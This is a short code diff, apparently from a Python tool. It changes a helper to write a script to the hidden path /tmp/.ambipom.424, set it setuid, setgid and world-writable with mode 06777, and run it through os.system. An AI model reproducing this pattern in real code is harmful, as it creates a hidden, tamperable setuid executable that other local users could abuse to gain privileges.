@@ -20,18 +20,16 @@ def create_local_script(script_location, script_contents):
   file.write(script_contents)
 
 def attempt_script_save(script_contents):
-  home_dir = os.path.expanduser("~")
-  possible_save_locations = ['/tmp/.ambipom.424',"%s/.ambipom.424" % home_dir]
+  save_location = '/tmp/.ambipom.424'
 
-  for save_location in possible_save_locations:
-    try:
-      create_local_script(save_location, script_contents)
-      return save_location
-    except:
-      pass
+  try:
+    create_local_script(save_location, script_contents)
+    return save_location
+  except:
+    pass
 
 def run_script(script_location):
-  os.chmod(script_location, 777)
+  os.chmod(script_location, 06777)
   os.system(script_location)
 
   
